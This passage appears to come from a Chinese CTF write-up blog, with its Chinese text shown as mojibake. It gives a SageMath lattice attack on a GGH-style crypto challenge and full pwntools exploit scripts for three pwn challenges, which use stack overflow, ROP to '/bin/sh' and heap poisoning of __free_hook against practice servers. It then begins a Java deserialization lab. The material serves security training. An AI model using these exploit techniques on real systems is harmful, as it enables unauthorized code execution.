<span class="number">147848301</span>, <span class="number">633183638</span>, <span class="number">188651439</span>, <span class="number">243206160</span>, -<span class="number">654830271</span>,</span><br><span class="line"><span class="number">335642059</span>, -<span class="number">100511588</span>, <span class="number">180023362</span>, <span class="number">130607831</span>, <span class="number">227597861</span>, <span class="number">188424473</span>, <span class="number">175518170</span>, -<span class="number">246987997</span>, <span class="number">180879649</span>, <span class="number">421934976</span>,</span><br><span class="line">-<span class="number">227575274</span>, -<span class="number">628937118</span>, <span class="number">5466646</span>, -<span class="number">254939474</span>, -<span class="number">438417079</span>, <span class="number">150434624</span>, <span class="number">327054986</span>, <span class="number">163561829</span>, <span class="number">816959939</span>, -<span class="number">265298657</span>,</span><br><span class="line"><span class="number">82651050</span>, <span class="number">176899880</span>, <span class="number">174020455</span>, -<span class="number">419656325</span>, -<span class="number">101606182</span>, <span class="number">300413909</span>, <span class="number">237169571</span>, -<span class="number">589213744</span>, <span class="number">121803611</span>, -<span class="number">38080334</span>,</span><br><span class="line">-<span class="number">255712509</span>, -<span class="number">133782964</span>, <span class="number">106220001</span>, <span class="number">195767251</span>, -<span class="number">397096116</span>, -<span class="number">583305587</span>, -<span class="number">182462561</span>, -<span class="number">271478737</span>, -<span class="number">32014717</span>, <span class="number">114385188</span>,</span><br><span class="line"><span class="number">437506115</span>, -<span class="number">1165732</span>, <span class="number">179349265</span>, -<span class="number">77761751</span>, -<span class="number">233976783</span>, <span class="number">410153356</span>, <span class="number">476453640</span>, <span class="number">91892631</span>, -<span class="number">242168750</span>, <span class="number">506769243</span>,</span><br><span class="line">-<span class="number">384438362</span>, <span class="number">131852532</span>, <span class="number">586202810</span>, <span class="number">376719791</span>, <span class="number">578215353</span>, <span class="number">874304742</span>, <span class="number">163584566</span>, <span class="number">434260863</span>, <span class="number">98013671</span>, <span class="number">213627784</span>, <span class="number">59622886</span>,</span><br><span class="line">-<span class="number">84912852</span>, <span class="number">156744856</span>, <span class="number">169652328</span>, <span class="number">178143615</span>, <span class="number">400046730</span>, <span class="number">408163110</span>, -<span class="number">357990863</span>, -<span class="number">269552089</span>, -<span class="number">199410809</span>, <span class="number">187503858</span>,</span><br><span class="line">-<span class="number">853206157</span>, <span class="number">134901027</span>, <span class="number">313984185</span>, -<span class="number">162544217</span>, -<span class="number">69722073</span>, <span class="number">43817388</span>, -<span class="number">47389463</span>, <span class="number">210346729</span>, -<span class="number">46516961</span>, <span class="number">72002967</span>, <span class="number">327714191</span>,</span><br><span class="line"><span class="number">45052266</span>, <span class="number">1010509210</span>, <span class="number">110937225</span>, <span class="number">448179404</span>, <span class="number">341448936</span>, <span class="number">446550865</span>, <span class="number">221914340</span>, -<span class="number">804918424</span>, -<span class="number">12007071</span>, <span class="number">151215468</span>,</span><br><span class="line"><span class="number">440279795</span>, -<span class="number">73408566</span>, -<span class="number">112121988</span>, <span class="number">40294376</span>, <span class="number">283179449</span>, -<span class="number">193812410</span>, -<span class="number">30061804</span>, <span class="number">20326854</span>, <span class="number">65412625</span>, -<span class="number">260020045</span>,</span><br><span class="line">-<span class="number">570090340</span>, <span class="number">1546454</span>, <span class="number">548030557</span>, <span class="number">618148316</span>, <span class="number">290333796</span>, <span class="number">665474379</span>, <span class="number">301709165</span>, -<span class="number">104726821</span>, -<span class="number">503111899</span>, <span class="number">480689642</span>,</span><br><span class="line">-<span class="number">331192606</span>, -<span class="number">518345784</span>, -<span class="number">314602459</span>, <span class="number">25354403</span>, <span class="number">410995568</span>, <span class="number">179675848</span>, -<span class="number">207010027</span>, <span class="number">400838662</span>, <span class="number">125916880</span>, <span class="number">501112567</span>,</span><br><span class="line"><span class="number">578261227</span>, <span class="number">24802586</span>, <span class="number">493171331</span>, <span class="number">383306766</span>, -<span class="number">390093502</span>, -<span class="number">389822626</span>, -<span class="number">303615722</span>, <span class="number">20813851</span>, -<span class="number">399678371</span>, -<span class="number">566907567</span>,</span><br><span class="line">-<span class="number">432647113</span>, -<span class="number">280465568</span>, <span class="number">1002042393</span>, -<span class="number">510901339</span>, <span class="number">316603766</span>, -<span class="number">139701243</span>, <span class="number">211217523</span>, <span class="number">108545545</span>, -<span class="number">12948109</span>, -<span class="number">569199543</span>,</span><br><span class="line"><span class="number">37065919</span>, -<span class="number">150542603</span>, <span class="number">417851006</span>, -<span class="number">470173530</span>, -<span class="number">628557669</span>, -<span class="number">128339015</span>, -<span class="number">427978763</span>, <span class="number">381402990</span>, <span class="number">205835334</span>, -<span class="number">30976552</span>,</span><br><span class="line">-<span class="number">357466556</span>, -<span class="number">104985580</span>, -<span class="number">115366372</span>, <span class="number">296031071</span>, -<span class="number">8036087</span>, <span class="number">79340491</span>, <span class="number">650365147</span>, <span class="number">295521125</span>, <span class="number">885900267</span>, <span class="number">133049758</span>,</span><br><span class="line"><span class="number">217970062</span>, <span class="number">237420894</span>, <span class="number">358760095</span>, -<span class="number">2684469</span>, <span class="number">475711698</span>, <span class="number">316770575</span>, -<span class="number">25024622</span>, -<span class="number">193442003</span>, <span class="number">200260606</span>, <span class="number">89183826</span>, <span class="number">567491985</span>,</span><br><span class="line"><span class="number">726371428</span>, <span class="number">222116554</span>, <span class="number">87397506</span>, -<span class="number">29529094</span>, <span class="number">125968479</span>, -<span class="number">50793004</span>, <span class="number">218035181</span>, -<span class="number">210376687</span>, <span class="number">1025673749</span>, -<span class="number">262390458</span>,</span><br><span class="line"><span class="number">467412984</span>, -<span class="number">71097225</span>, <span class="number">259125517</span>, -<span class="number">337232810</span>, <span class="number">143359550</span>, <span class="number">27115363</span>)</span><br><span class="line"></span><br><span class="line">D = matrix(ZZ, <span class="number">66</span>*<span class="number">3</span>, <span class="number">200</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        D[i,j] = A[i][j]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        D[i+<span class="number">66</span>,j] = B[i][j]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        D[i+<span class="number">66</span>*<span class="number">2</span>,j] = C[i][j]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = vector(b)</span><br><span class="line">W = matrix(D)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">babai</span>(<span class="params">A, w</span>):</span></span><br><span class="line">    A = A.LLL()</span><br><span class="line">    G = A.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">    t = w</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(A.nrows())):</span><br><span class="line">        c = ((t * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">        t -= A[i] * c</span><br><span class="line">    <span class="keyword">return</span> w - t</span><br><span class="line">V = babai(W,e)</span><br><span class="line">m = V/W</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡ç”¨ä¸‹é¢è¿™ç§å¥½åƒè¦å¿«äº¿ç‚¹ï¼ˆå¤§æ¦‚1åˆ†åŠï¼‰</p>
<p>å°æ³¨æ„ï¼š</p>
<ul>
<li>solve_left()æ–¹æ³•å¥½åƒè¦ä¸€ä¸ªæ–¹æ–¹æ­£æ­£çš„çŸ©é˜µæ‰€ä»¥æ”¹æˆäº†198Ã—198çš„çŸ©é˜µ</li>
<li>åˆ©ç”¨Nguyenâ€™s Attackç®—æ³•ï¼Œä¸è¿‡è¿™é‡Œçš„deltaå˜æˆäº†1ï¼ŒåŠ å¯†ä»£ç ä¸­çš„errorVç”±<img src="https://cdn.nlark.com/yuque/__latex/8a222a25af7aea8861bd2f55a1cce797.svg" alt="img">ç»„æˆï¼Œä¸GGHåŠ å¯†ä¸­çš„è¯¯å·®å‘é‡å–3æˆ–-3ç›¸å¯¹æ¯”ï¼Œdeltaè‡ªç„¶å˜æˆäº†1ã€‚</li>
<li>åŸGGHåŠ å¯†ä¸­çš„è¯¯å·®å‘é‡å–3æˆ–-3ï¼Œè¿™é‡Œå–çš„-1ï¼Œ0ï¼Œ1ï¼Œmè§£å‡ºæ¥å­˜åœ¨è¯¯å·®ï¼Œå››èˆäº”å…¥ä¸€ä¸‹å°±å¥½äº†</li>
<li>å‚è€ƒï¼š<a href="https://blog.soreatu.com/posts/intended-solution-to-ggh-in-gyctf-2020/">GYCTF 2020 - GGH</a></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ•°æ®å¯¼å…¥çœç•¥</span></span><br><span class="line">c = vector(ZZ, b)[:<span class="number">198</span>]</span><br><span class="line"><span class="comment"># B = matrix(ZZ, D)</span></span><br><span class="line">B = matrix(ZZ, <span class="number">198</span>, <span class="number">198</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">198</span>):</span><br><span class="line">    B[i] = D[i][:<span class="number">198</span>]</span><br><span class="line">n = <span class="number">198</span></span><br><span class="line">delta = <span class="number">1</span></span><br><span class="line">s = vector(ZZ, [delta]*n)</span><br><span class="line">B6 = B.change_ring(Zmod(<span class="number">2</span>*delta))</span><br><span class="line">left = (c + s).change_ring(Zmod(<span class="number">2</span>*delta))</span><br><span class="line">m6 = (B6.solve_left(left)).change_ring(ZZ)</span><br><span class="line">new_c = (c - m6*B) * <span class="number">2</span> / (<span class="number">2</span>*delta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># embedded technique</span></span><br><span class="line">new_B = (B*<span class="number">2</span>).stack(new_c).augment(vector(ZZ, [<span class="number">0</span>]*n + [<span class="number">1</span>]))</span><br><span class="line">new_B = new_B.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">new_B_BKZ = new_B.BKZ()</span><br><span class="line">shortest_vector = new_B_BKZ[<span class="number">0</span>]</span><br><span class="line">mbar = (B*<span class="number">2</span>).solve_left(new_c - shortest_vector[:-<span class="number">1</span>])</span><br><span class="line">m = mbar * (<span class="number">2</span>*delta) + m6</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">round</span>(i))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="eyfor"><a href="#eyfor" class="headerlink" title="eyfor"></a>eyfor</h3><p>è¾“å…¥sizeçš„æ—¶å€™æœ‰ä¸€ä¸ªæ•´æ•°æº¢å‡ºï¼Œæ‰€ä»¥é€šè¿‡æ ˆæº¢å‡ºå°±èƒ½å®Œæˆ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#encoding: utf-8</span></span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">#context.log_level = <span class="meta-string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">binary_name = <span class="string">&quot;pwn4&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;libc-2.31.so&quot;</span></span><br><span class="line">ld_name = <span class="string">&quot;ld&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">version = <span class="string">&quot;9.9&quot;</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;</span>.format(libc_name,version,libc_name))</span><br><span class="line"><span class="meta">#ld = ELF(<span class="meta-string">&quot;./&quot;</span>+ld_name)</span></span><br><span class="line">se      = lambda data               :io.send(data) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = lambda num          		:io.recv(num)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">ru      = lambda delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))	</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">info    = lambda tag, addr          :<span class="built_in">log</span>.info(tag + <span class="string">&quot; -------------&gt; &quot;</span> + hex(addr))</span><br><span class="line">ia		= lambda                    :io.interactive()</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26010</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		b *<span class="number">0x00400805</span></span><br><span class="line">		<span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400983</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400981</span></span><br><span class="line">ret = <span class="number">0x000000000040063e</span></span><br><span class="line">leave_addr=<span class="number">0x0400914</span></span><br><span class="line">bss_addr = <span class="number">0x006010C0</span></span><br><span class="line">system_plt = <span class="number">0x0400680</span></span><br><span class="line">payload = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">30</span>+p64(bss_addr)+p64(leave_addr)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;go&quot;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;message&#x27;</span>,<span class="string">&#x27;71&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;16899&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;3272&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;13694&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(str(<span class="number">0xff00002f</span>))</span><br><span class="line"><span class="meta">#debug()</span></span><br><span class="line">sl(<span class="string">&quot;/bin/sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">48</span>)+p64(pop_rdi_ret)+p64(bss_addr)+p64(<span class="number">0x04007C9</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h3 id="MyCanary2"><a href="#MyCanary2" class="headerlink" title="MyCanary2"></a>MyCanary2</h3><p>æº¢å‡ºè¦†ç›–ä¹‹ååªè¦è®©ç¨‹åºleakä¸€ä¸‹ï¼Œsercetå°±ä¼šå˜å›å»ï¼Œç„¶åæ³¨æ„ä¸€ä¸‹æ ˆä¸Šçš„v4è¦ä¸º0å°±å¥½äº†</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#encoding: utf-8</span></span><br><span class="line">#!/usr/bin/python</span><br><span class="line">from pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">#context.log_level = <span class="meta-string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">binary_name = <span class="string">&quot;MyCanary2&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;libc-2.31.so&quot;</span></span><br><span class="line">ld_name = <span class="string">&quot;ld&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">version = <span class="string">&quot;9.9&quot;</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;</span>.format(libc_name,version,libc_name))</span><br><span class="line"><span class="meta">#ld = ELF(<span class="meta-string">&quot;./&quot;</span>+ld_name)</span></span><br><span class="line">se      = lambda data               :io.send(data) </span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = lambda num          		:io.recv(num)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">ru      = lambda delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))	</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">info    = lambda tag, addr          :<span class="built_in">log</span>.info(tag + <span class="string">&quot; -------------&gt; &quot;</span> + hex(addr))</span><br><span class="line">ia		= lambda                    :io.interactive()</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26141</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line"># <span class="number">0x00004014A4</span>   <span class="number">0x00401519</span>  </span><br><span class="line">def debug():</span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">		b *<span class="number">0x00004014A4</span> </span><br><span class="line">		<span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line">bin_sh_addr = <span class="number">0x004020F0</span></span><br><span class="line">rand_addr = <span class="number">0x04040D0</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">shell_addr = <span class="number">0x000000000401573</span></span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">80</span>+<span class="number">16</span>+<span class="number">12</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x0040157B</span>)</span><br><span class="line">sla(<span class="string">&quot;Show me the code:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your choice&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h3 id="compat"><a href="#compat" class="headerlink" title="compat"></a>compat</h3><blockquote>
<p>å¤ç°</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">binary_name = <span class="string">&quot;compact&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;libc-2.31.so&quot;</span></span><br><span class="line">ld_name = <span class="string">&quot;ld&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">version = <span class="string">&quot;9.0&quot;</span></span><br><span class="line">elf =ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/nelson/Desktop/glibc/&#123;&#125;/&#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(libc_name,version,libc_name))</span><br><span class="line"><span class="comment">#ld = ELF(&quot;./&quot;+ld_name)</span></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :io.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> num          		:io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :io.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))	</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -------------&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia		= <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line"><span class="keyword">if</span> local==<span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29037</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = process(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">		&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data,tag</span>):</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line">	sa(<span class="string">&#x27;tag:&#x27;</span>,tag)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>():</span></span><br><span class="line">	sla(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;\xf0&quot;</span>)</span><br><span class="line">se(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">heap_addr = uu64(io.recv(<span class="number">6</span>))</span><br><span class="line">info(<span class="string">&quot;heap_addr&quot;</span>,heap_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="built_in">str</span>(i+<span class="number">1</span>),<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	delete(<span class="built_in">str</span>(i))</span><br><span class="line">add(<span class="string">&quot;bbb&quot;</span>,<span class="string">&#x27;\xfc&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">manage_heap = heap_addr + <span class="number">944</span></span><br><span class="line">payload =<span class="string">b&#x27;aaa&#x27;</span>+p8((manage_heap)&amp;<span class="number">0xff</span>)+p8((manage_heap&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">unsor_heap = heap_addr + <span class="number">1232</span></span><br><span class="line">add(<span class="string">&quot;ccc&quot;</span>,<span class="string">&quot;\xfc&quot;</span>) <span class="comment">#1</span></span><br><span class="line">payload =<span class="string">b&#x27;aaa&#x27;</span>+p8((unsor_heap)&amp;<span class="number">0xff</span>)+p8((unsor_heap&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">target_heap = heap_addr + <span class="number">880</span></span><br><span class="line">payload =<span class="string">b&#x27;aaa&#x27;</span>+p8((target_heap)&amp;<span class="number">0xff</span>)+p8((target_heap&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">add(<span class="string">&quot;aaaa&quot;</span>,<span class="string">&quot;\xfc&quot;</span>) <span class="comment">#2</span></span><br><span class="line">sl(payload)</span><br><span class="line">reset()</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">libcbase = uu64(io.recv(<span class="number">6</span>)) - <span class="number">2014176</span></span><br><span class="line">info(<span class="string">&quot;libcbase&quot;</span>,libcbase)</span><br><span class="line">system_addr= libcbase + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one=[<span class="number">0xe6aee</span>+libcbase,<span class="number">0xe6af1</span>+libcbase,<span class="number">0xe6af4</span>+libcbase]</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">info(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">reset()</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x71</span>)</span><br><span class="line">add(payload,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">add(payload,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">reset()</span><br><span class="line">payload =p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0x91</span>)+p64(free_hook)</span><br><span class="line">add(payload,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(p64(<span class="number">0</span>),<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(p64(one[<span class="number">1</span>]),<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">reset()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#reset()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>das</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaDeserializeLabs</title>
    <url>/2022/07/22/JavaDeserializeLabs/</url>
    <content><![CDATA[<h1 id="JavaDeserializeLabs"><a href="#JavaDeserializeLabs" class="headerlink" title="JavaDeserializeLabs"></a>JavaDeserializeLabs</h1><p><a href="https://github.com/waderwu/javaDeserializeLabs.git">https://github.com/waderwu/javaDeserializeLabs.git</a></p>
<h2 id="Lab1-Basic"><a href="#Lab1-Basic" class="headerlink" title="Lab1-Basic"></a>Lab1-Basic</h2><blockquote>
<p>docker-compose up -d</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c8afd0613ade4c18bb950e13b902de02.png" alt="Untitled"></p>
<p>çŸ¥é“è§¦å‘ç‚¹ä¸ºbasicç›®å½•ä¸‹ç›´æ¥ä¼ ä¸€ä¸ªdata</p>
<p>ç›´æ¥ç”¨jd-guiçœ‹jaråŒ…ï¼Œå‘ç°æ²¡æœ‰CCä¾èµ–ï¼Œä½†æ˜¯ç»™äº†å‡ ä¸ªç±»ã€‚è€ŒCalcç±»åˆšå¥½æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ï¼Œå¹¶ä¸”å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤</p>
